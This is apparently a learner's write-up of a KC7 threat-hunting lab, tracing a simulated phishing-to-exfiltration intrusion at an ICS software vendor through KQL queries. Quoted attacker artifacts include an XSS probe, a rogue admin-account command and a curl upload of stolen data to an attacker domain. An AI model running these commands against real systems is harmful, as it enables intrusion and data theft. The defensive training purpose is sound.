# Solvi Systems — A Tale of Supply Chains and ICS (KC7)

**Security Analyst II path, Module 3** · Completed Nov 17, 2026 · KC7 Foundation certificate ID 102427

> **Format note:** my query notes record findings by attack phase rather than by question number, so this write-up is organized by phase. Question numbers are only given where a screenshot showed them.

---

## Scenario

Solvi Systems builds **DOCKS**, industrial control system (ICS) software. The company has about **500 employees** and trades with energy-sector partners, so it sits in a supply chain. The module asks how an attacker who gets into a software vendor could use that access to find vulnerabilities in the product, and what that means for customers downstream.

**Learning objectives:**
- Investigate a supply chain attack involving Industrial Control Systems
- Understand how an attack on ICS software can have downstream impact
- Combine multiple data sources (network logs, DNS, authentication events) into a detailed timeline, from reconnaissance to data exfiltration

**Skills:** triaging alerts · finding persistence mechanisms · understanding why attackers attack · mapping attacker TTPs · recognizing common entry points · detecting network compromise

**Topics:** critical infrastructure · phishing · remote services exploitation · malware

**Dataset:** `SolviSystems` (Azure Data Explorer, KC7)

**Tables available (10):** AuthenticationEvents, Email, Employees, FileCreationEvents, InboundNetworkEvents, NetworkFlow, OutboundNetworkEvents, PassiveDns, ProcessEvents, SecurityAlerts

---

## 1. Getting oriented

| Question | Query | Finding |
|---|---|---|
| How many employees? | `Employees \| count` | **500** |
| Who is the CTO? | `Employees \| where role == "CTO"` | **Alexis Khoza**, `ip_addr` `10.10.0.7` |
| Emails received by the CTO | `Email \| where recipient == "alexis_khoza@solvisystems.com"` | 31 records |
| Distinct senders from `eskom.co.za` | `Email \| where sender has "eskom.co.za" \| distinct sender \| count` | 745 |
| Distinct URLs the CTO's machine visited | `OutboundNetworkEvents \| where src_ip == "10.10.0.7" \| distinct url \| count` | 72 |
| Domains containing "real" | `PassiveDns \| where domain contains "real" \| distinct domain \| count` | 19 |
| IPs behind `bit.ly` | `PassiveDns \| where domain == "bit.ly"` | 10 records |
| Employees named Mary | `Employees \| where name has "Mary"` | 10 people |

**Joining two tables with `let`:** find the people first, then use their IPs or usernames to search another table.

```kql
let mary_ips =
Employees
| where name has "Mary"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (mary_ips)
| distinct url
```

- Mary's machines: 1,153 rows by `count`, but **847 distinct URLs**. `count` and `distinct ... | count` answer different questions.
- Mary's authentication events: **1,150**.

---

## 2. Triaging the alert: XSS probing

A detection rule fired:

- **Severity:** HIGH
- **Rule:** "SUSPICIOUS TEXT IN HTTP REQUEST"
- **URL:** `https://www.solvisystems.com/feedback?message=</script><script>alert('xss')</script>`

This is **XSS** (cross-site scripting): script injected into a form parameter.

```kql
InboundNetworkEvents
| where url contains "alert"
```

- Status code **404**, user agent **`Opera/8.64`**.
- The same request appears URL-encoded: `...%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E`.
- The probe didn't succeed (404), but it shows the attacker testing the public site.

**Pivoting on the user agent:**

```kql
InboundNetworkEvents
| where user_agent contains "Opera/8.64"
| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))
```

9 records, and from these the attacker IPs were identified.

**Attacker IPs:** `105.78.23.64`, `13.201.46.208`, `56.6.30.190`, `98.117.26.236`

---

## 3. Reconnaissance

```kql
let attacker_ips = dynamic(["105.78.23.64", "13.201.46.208", "56.6.30.190", "98.117.26.236"]);
InboundNetworkEvents
| where src_ip in (attacker_ips)
| where url has "solvisystems"
| order by timestamp asc
```

- **64 requests** browsing Solvi Systems.
- **First request:** 2024-05-01 00:00:00 from `98.117.26.236`.
- Before 2024-05-03, the first product researched was `docks-ins`, by `105.78.23.64`. The attacker was reading about the company's ICS product, the target of the supply chain angle.

---

## 4. Infrastructure pivot: attacker IPs to domains

```kql
let attacker_ips = dynamic(["105.78.23.64", "13.201.46.208", "56.6.30.190", "98.117.26.236"]);
PassiveDns
| where ip in (attacker_ips)
| distinct domain
```

3 domains: **`energy-trends4u.net`**, **`news-on-industry.com`**, **`eco-awareness-update.net`**

All three are made to look like energy-industry news and awareness sites, which suits a target that sells to energy customers.

---

## 5. Initial access: phishing (Section 3, "Snail Mail")

**Q1: How many emails associated with these domains did Solvi employees receive? → 56**

My first attempt returned **0**:

```kql
let attacker_domains = PassiveDns
    | where ip in (attacker_ips)
    | summarize make_list(domain);
Email
| where sender has_any (attacker_domains)   // wrong column
| count
```

Two mistakes: the domains are in the email **`link`** column, not `sender`; and `make_list()` produces a single array value, so `has_any` had nothing to match. Using `distinct` gives a one-column table that `has_any` can use.

```kql
let attacker_ips = dynamic(["105.78.23.64", "13.201.46.208", "56.6.30.190", "98.117.26.236"]);
let attacker_domains = PassiveDns
    | where ip in (attacker_ips)
    | distinct domain;
Email
| where link has_any (attacker_domains)
| count
```

Two other approaches were dead ends and are worth remembering:

- **Summarizing sender domains** gave 12 external domains, dominated by `protonmail.com`, `hotmail.com`, `gmail.com` and partner domains. Picking suspicious-looking ones by eye returned the wrong count (1,504).
- **Summarizing link domains** gave 7,592 rows of mostly Google, SharePoint and Wikipedia links. Frequency doesn't tell you what's malicious.

### Scoping the campaign

| Question | Finding |
|---|---|
| Distinct sender/reply-to addresses used by the threat actor | **3** (e.g. `news@eco-awareness-update.net`, `energy_industry_news@...`, `electric_updates@gmail.com` as reply-to) |
| Distinct filenames in the malicious links | **3** |
| Distinct roles targeted | **5** |
| Customer Support Specialists who received them | **27** distinct recipients |

```kql
Email
| where link has_any ("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net")
| join kind=inner (Employees) on $left.recipient == $right.email_addr
| summarize count() by role
```

| Role | Emails |
|---|---|
| Customer Support Specialist | 32 |
| Sales Representative | 21 |
| Project Manager for DOCKS ICS | 1 |
| DOCKS Customer Success Manager | 1 |
| DOCKS ICS Security Lead | 1 |

The bulk went to customer-facing roles, but the three single-recipient emails went to people close to the DOCKS product, which fits the attacker's earlier interest in it.

**Distinct-address query:**

```kql
let bad_emails = Email
    | where link has_any (attacker_domains);
union
    (bad_emails | project addr = tolower(sender)),
    (bad_emails | project addr = tolower(reply_to))
| where isnotempty(addr)
| summarize dcount(addr)
```

---

## 6. First victim: Carla Wharton

```kql
Email
| where link has_any ("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net")
| order by timestamp asc
| take 1
```

| Field | Value |
|---|---|
| First malicious email | 2024-05-01 15:51:41 UTC |
| Recipient | Carla Wharton (`carla_wharton@solvisystems.com`), Sales Representative |
| Username / host / IP | `cawharton` / `JUSP-LAPTOP` / `10.10.0.164` |
| Sender / reply-to | `news@eco-awareness-update.net` / `electric_updates@gmail.com` |

**Outbound request from her machine:**

```kql
OutboundNetworkEvents
| where src_ip == "10.10.0.164"
| where url has_any ("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net")
| order by timestamp asc
```

She downloaded `http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx`, a document themed to her industry and to Solvi.

---

## 7. Execution and C2

```kql
FileCreationEvents
| where hostname == "JUSP-LAPTOP"
| where timestamp > datetime(2024-05-01 15:58:29)
| order by timestamp asc
```

| Field | Value |
|---|---|
| File | `ecobug.exe` |
| Path | `C:\ProgramData\ecobug.exe` |
| Created by | `explorer.exe` (the user opened it) |
| SHA-256 | `1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252` |
| Org-wide | **39** `ecobug.exe` file-creation records |

**Beaconing:**

```kql
NetworkFlow
| where src_ip == "10.10.0.164"
| where timestamp > datetime(2024-05-01 15:58:29)
| order by timestamp asc
```

- Destination **`98.117.26.236`**, port **1337**, TCP. Source port 61484 at 2024-05-01 17:38:25.
- Carla's machine connected to this IP **once**, at 2024-05-01 17:38:25 (accepted answer: 1).
- Across the company: **470** connections to `98.117.26.236` from **38 distinct employee machines**.

`98.117.26.236` is the same IP that made the very first recon request, so the attacker's reconnaissance address and C2 server are the same host.

---

## 8. Persistence and discovery

```kql
ProcessEvents
| where timestamp >= datetime(2024-05-02)
| where process_commandline has_any ("net user", "useradd", "localgroup") or process_name has_any ("net.exe", "net1.exe")
| project timestamp, hostname, username, process_name, process_commandline
| order by timestamp asc
```

165 records. The key finding was a rogue account:

```
net users /add gu@rd!an abc1toothree
```

A new local user `gu@rd!an` with a hardcoded password, created from the command line. 69 records matched `add`. The record itself:

| Field | Value |
|---|---|
| Time | 2024-05-02 16:50:49 UTC |
| Host / user | `JUSP-LAPTOP` / `cawharton` (Carla's account) |
| Process | `net.exe`, parent `cmd.exe` |
| Command | `net users /add gu@rd!an abc1toothree` |

The attacker then made the account an administrator:

```
net localgroup administrators gu@rd!an /add
```

**Discovery on `JUSP-LAPTOP`** (25 process records after the malware ran): `ipconfig /all`, `net view`, `systeminfo`, `net share`, and `net use`. **`net use` was the last discovery command** the adversary issued (parent `cmd.exe`, process `net.exe`).

```kql
ProcessEvents
| where process_commandline has "net use"
| summarize count() by process_commandline
```

- 2 distinct `net use` command lines.
- The notable variant is **`net use /PERSISTENT:YES`**, which makes the mapped drive survive reboots.

---

## 9. Lateral movement and collection

```kql
ProcessEvents
| where process_commandline has "/PERSISTENT:YES"
| project timestamp, hostname, process_commandline
| order by timestamp asc
```

```kql
ProcessEvents
| where process_commandline == "net use /PERSISTENT:YES"
| distinct hostname
```

The command ran on **3 distinct hosts** (accepted answer: 3): **`SJ9V-MACHINE`**, **`UPLM-DESKTOP`** and **`JP4D-MACHINE`**. The first use was **2024-05-27 16:23:10** on **`SJ9V-MACHINE`**.

```kql
Employees
| where username == "alpetrov" or hostname == "SJ9V-MACHINE"
```

Owner: **Alexei Petrov**, Docks Customer Success Manager, `10.10.0.3`, `alexei_petrov@solvisystems.com`.

**Collection from a network share (PowerShell):**

```
Copy-Item -Path \\solvisystems.com\SharedDocs\SoftwareDevelopment\CycleDocuments\*
          -Destination C:\Users\alpetrov\CollectedData\Software_Cycle_Docs
```

The attacker copied the **software development lifecycle documents** from a shared drive. For a vendor of ICS software, that's the supply chain angle: how the product is built and tested.

**Staging:** the documents were archived as **`CollectedData.zip`** at 2024-05-27 17:52:50 (PowerShell).

---

## 10. Exfiltration

```kql
ProcessEvents
| where process_commandline has_any ("curl", "eco-awareness-update.net", "DataExfil")
| project timestamp, hostname, username, process_commandline
| order by timestamp asc
```

```
curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload
```

- Run via `cmd.exe`. The upload goes to **`eco-awareness-update.net`**, one of the three campaign domains from the phishing emails. Same infrastructure from first email to last upload.
- 6 records matched, from **3 accounts** the threat actor used.

**Follow-up activity:**

- An email from `alexei_petrov@solvisystems.com` titled "Urgent Request: DOCKS System Documentation" went to `bernadette_callahan@solvisystems.com` between 05-27 and 05-29. Alexei's account was the compromised one, so this request came from the attacker, who used it to ask a colleague for more DOCKS documentation.
- On **2024-05-29 10:13:18**, attacker IP `13.201.46.208` requested `https://devportal.solvisystems.com/development_lifecycle/internal_process.pdf` from the dev portal, after the bulk copy.

---

## Timeline

| Time (UTC) | Event | Source |
|---|---|---|
| 2024-05-01 00:00 | First recon request to solvisystems.com from `98.117.26.236` | `InboundNetworkEvents` |
| 2024-05-01 (before 05-03) | `docks-ins` product pages researched from `105.78.23.64` | `InboundNetworkEvents` |
| 2024-05-01 15:51:41 | First phishing email delivered to Carla Wharton | `Email` |
| 2024-05-01 after 15:58 | `Energy_Industry_Trends_2024_4_Solvi.docx` downloaded; `ecobug.exe` created in `C:\ProgramData\` | `OutboundNetworkEvents`, `FileCreationEvents` |
| 2024-05-01 17:38:25 | `JUSP-LAPTOP` beacons to `98.117.26.236:1337` | `NetworkFlow` |
| 2024-05-02 | Discovery on `JUSP-LAPTOP` (`ipconfig /all`, `net view`, `systeminfo`, `net share`, `net use`); rogue account `gu@rd!an` created at 16:50:49 and added to local Administrators | `ProcessEvents` |
| 2024-05-03 to 05-05 | `Opera/8.64` requests, including the XSS probe (404) | `InboundNetworkEvents` |
| 2024-05-27 16:23:10 | First `net use /PERSISTENT:YES`, on `SJ9V-MACHINE` (Alexei Petrov); the command also ran on `UPLM-DESKTOP` and `JP4D-MACHINE` | `ProcessEvents` |
| 2024-05-27 17:52:50 | `CollectedData.zip` created | `ProcessEvents` |
| 2024-05-28 to 05-29 | `curl` upload of the zip to `api.eco-awareness-update.net` | `ProcessEvents` |
| 2024-05-29 10:13:18 | `13.201.46.208` fetches `internal_process.pdf` from the dev portal | `InboundNetworkEvents` |

---

## MITRE ATT&CK mapping

> My own mapping from the commands observed; review before publishing.

| Phase | Observed | Technique | Tactic |
|---|---|---|---|
| Reconnaissance | Browsing company site and product pages; XSS probe | [T1595](https://attack.mitre.org/techniques/T1595/) Active Scanning | Reconnaissance |
| Initial Access | Phishing links to lookalike energy-news domains | [T1566.002](https://attack.mitre.org/techniques/T1566/002/) Spearphishing Link | Initial Access |
| Execution | User opens downloaded file; `ecobug.exe` runs | [T1204](https://attack.mitre.org/techniques/T1204/) User Execution | Execution |
| Command and Control | Beacon to `98.117.26.236:1337` | [T1571](https://attack.mitre.org/techniques/T1571/) Non-Standard Port | Command and Control |
| Persistence | `net users /add gu@rd!an` | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) Create Account: Local | Persistence |
| Persistence | `net localgroup administrators gu@rd!an /add` | [T1098](https://attack.mitre.org/techniques/T1098/) Account Manipulation | Persistence |
| Discovery | `net share`, `net use` | [T1135](https://attack.mitre.org/techniques/T1135/) Network Share Discovery | Discovery |
| Lateral Movement | `net use /PERSISTENT:YES` to mapped drives | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) SMB/Windows Admin Shares | Lateral Movement |
| Collection | `Copy-Item` from `SharedDocs\SoftwareDevelopment` | [T1039](https://attack.mitre.org/techniques/T1039/) Data from Network Shared Drive | Collection |
| Collection | `CollectedData.zip` | [T1560](https://attack.mitre.org/techniques/T1560/) Archive Collected Data | Collection |
| Exfiltration | `curl -F` upload to `api.eco-awareness-update.net` | [T1048](https://attack.mitre.org/techniques/T1048/) Exfiltration Over Alternative Protocol | Exfiltration |

---

## Indicators of compromise

| Type | Value |
|---|---|
| IPs | `105.78.23.64`, `13.201.46.208`, `56.6.30.190`, `98.117.26.236` |
| Domains | `energy-trends4u.net`, `news-on-industry.com`, `eco-awareness-update.net` |
| Malicious file | `ecobug.exe` (`C:\ProgramData\`), SHA-256 `1c3ef040...3252` |
| Lure file | `Energy_Industry_Trends_2024_4_Solvi.docx` |
| C2 | `98.117.26.236:1337` (TCP) |
| User agent | `Opera/8.64` |
| Rogue account | `gu@rd!an` (added to local Administrators on `JUSP-LAPTOP`) |
| Exfil | `https://api.eco-awareness-update.net/upload`, `CollectedData.zip` |

---

## Lessons

- **Start from a known indicator, then pivot.** Attacker IPs led to domains (`PassiveDns`), the domains led to the emails, the emails to the victim, and the victim to the endpoint and network evidence.
- **Ask which column the evidence lives in.** My first query returned 0 because the domains were in `link`, not `sender`. A phishing email can come from Gmail and still point at an attacker domain.
- **`make_list()` isn't a lookup table.** It produces one array row. Use `distinct` when a later `has_any` or `in` needs a column.
- **Frequency is not maliciousness.** Counting the most common domains returned noise and the wrong answer. Pivot from threat indicators instead.
- **Reuse of infrastructure ties the story together.** The recon IP was also the C2, and one of the phishing domains received the exfiltrated data.
- **Separate queries with a blank line.** The editor runs the query your cursor is in, so a result can belong to a different query than the one you're reading.
- **Write the finding next to every query.** My notes became the incident timeline almost as they were.

## Open points to verify

- **Flow count:** the accepted answer was 1, but my notes also show a raw count of 24 records for that IP pair. Not reconciled, so the 24 is left out above.
- **Which three accounts** ran the exfiltration commands (the count of 3 is recorded, the names aren't).
- **Lateral movement path:** `net use /PERSISTENT:YES` ran on three hosts (`SJ9V-MACHINE`, `UPLM-DESKTOP`, `JP4D-MACHINE`), but I haven't recorded how the attacker reached them from `JUSP-LAPTOP`, or who owns `UPLM-DESKTOP` and `JP4D-MACHINE`. Check `Employees` for the hosts and `AuthenticationEvents` for the logins.
